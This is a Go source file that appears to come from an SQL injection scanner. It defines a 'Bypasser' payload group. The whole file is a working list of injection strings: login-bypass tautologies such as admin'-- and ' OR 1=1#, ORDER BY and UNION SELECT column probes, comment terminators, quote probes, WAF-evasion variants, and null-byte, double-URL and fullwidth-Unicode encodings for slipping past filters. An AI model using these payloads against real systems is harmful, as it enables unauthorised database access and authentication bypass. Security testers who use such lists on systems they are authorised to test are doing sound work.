package payloads

var Bypasser = PayloadGroup{
	DBMS: "Bypasser",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// BLIND INJECTION BYPASS
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "'%20or%20'1'='1"},
		{Type: "boolean", Content: "admin'--"},
		{Type: "boolean", Content: "admin' #"},
		{Type: "boolean", Content: "' or 1=1/*"},
		{Type: "boolean", Content: "' or 1=1#"},
		{Type: "boolean", Content: "' or 1=1-- -"},
		{Type: "boolean", Content: "' or 1=1--+"},

		// ═══════════════════════════════════════════
		// ORDER BY / GROUP BY / UNION DETECTION
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "1' ORDER BY 1--"},
		{Type: "boolean", Content: "1' ORDER BY 2--"},
		{Type: "boolean", Content: "1' ORDER BY 3--"},
		{Type: "boolean", Content: "1' ORDER BY 4--"},
		{Type: "boolean", Content: "1' ORDER BY 5--"},
		{Type: "boolean", Content: "1' ORDER BY 6--"},
		{Type: "boolean", Content: "1' ORDER BY 7--"},
		{Type: "boolean", Content: "1' ORDER BY 8--"},
		{Type: "boolean", Content: "1' ORDER BY 9--"},
		{Type: "boolean", Content: "1' ORDER BY 10--"},
		{Type: "boolean", Content: "1' UNION SELECT NULL--"},
		{Type: "boolean", Content: "1' UNION SELECT NULL,NULL--"},
		{Type: "boolean", Content: "1' UNION SELECT NULL,NULL,NULL--"},
		{Type: "boolean", Content: "1' GROUP BY 1--"},
		{Type: "boolean", Content: "1' GROUP BY 2--"},
		{Type: "boolean", Content: "1' GROUP BY 3--"},

		// ═══════════════════════════════════════════
		// COMMENT INJECTION BYPASSES
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "'--"},
		{Type: "boolean", Content: "'#"},
		{Type: "boolean", Content: "'/*"},
		{Type: "boolean", Content: "'-- -"},
		{Type: "boolean", Content: "'--+"},
		{Type: "boolean", Content: "admin'-- -"},
		{Type: "boolean", Content: "admin'#"},
		{Type: "boolean", Content: "admin'/*"},
		{Type: "boolean", Content: "')--"},
		{Type: "boolean", Content: "')#"},
		{Type: "boolean", Content: "'))--"},
		{Type: "boolean", Content: "'))#"},
		{Type: "boolean", Content: "1'--"},
		{Type: "boolean", Content: "1'#"},
		{Type: "boolean", Content: "1'/*"},
		{Type: "boolean", Content: "' OR '1'='1'-- -"},
		{Type: "boolean", Content: "' OR '1'='1'#"},
		{Type: "boolean", Content: "' OR 1=1#"},
		{Type: "boolean", Content: "' OR 1=1-- -"},
		{Type: "boolean", Content: "' OR 1=1--+"},
		{Type: "boolean", Content: "' OR 1=1 /*"},

		// ═══════════════════════════════════════════
		// HTTP PARAMETER INJECTION
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "'"},
		{Type: "boolean", Content: "\""},
		{Type: "boolean", Content: "\\'"},
		{Type: "boolean", Content: "\\\""},
		{Type: "boolean", Content: "`"},
		{Type: "boolean", Content: "'\""},
		{Type: "boolean", Content: "';"},
		{Type: "boolean", Content: "%27"},
		{Type: "boolean", Content: "%22"},
		{Type: "boolean", Content: "%2527"},
		{Type: "boolean", Content: "%2522"},

		// ═══════════════════════════════════════════
		// WAF SIGNATURE BYPASS
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' OR 1=1--"},
		{Type: "boolean", Content: "' OR 2>1--"},
		{Type: "boolean", Content: "' OR 1<2--"},
		{Type: "boolean", Content: "' OR 1 BETWEEN 0 AND 2--"},
		{Type: "boolean", Content: "' OR NOT 1=0--"},
		{Type: "boolean", Content: "' OR 1 IN (1,2)--"},
		{Type: "boolean", Content: "' OR 1 IS NOT NULL--"},
		{Type: "boolean", Content: "' OR LENGTH('a')=1--"},
		{Type: "boolean", Content: "' OR CHAR(49)=49--"},
		{Type: "boolean", Content: "' OR ASCII('a')=97--"},
		{Type: "boolean", Content: "' OR UNICODE('a')=97--"},
		{Type: "boolean", Content: "' OR 1=1 AND 1=1--"},
		{Type: "boolean", Content: "' OR (1)=(1)--"},
		{Type: "boolean", Content: "' OR 1=1 || '1'='1"},

		// ═══════════════════════════════════════════
		// NULL BYTE & ENCODING BYPASS
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "'%00OR%201=1--"},
		{Type: "boolean", Content: "'%00OR%201=1--"},
		{Type: "boolean", Content: "%27+OR+1%3D1--"},
		{Type: "boolean", Content: "%2527%2520OR%25201%253D1%2520--"},
		{Type: "boolean", Content: "%ef%bc%87%ef%bc%8for%ef%bc%91%ef%bc%9d%ef%bc%91"},
		{Type: "boolean", Content: "%uff07%uff4f%uff52%uff11%uff1d%uff11"},
	},
}
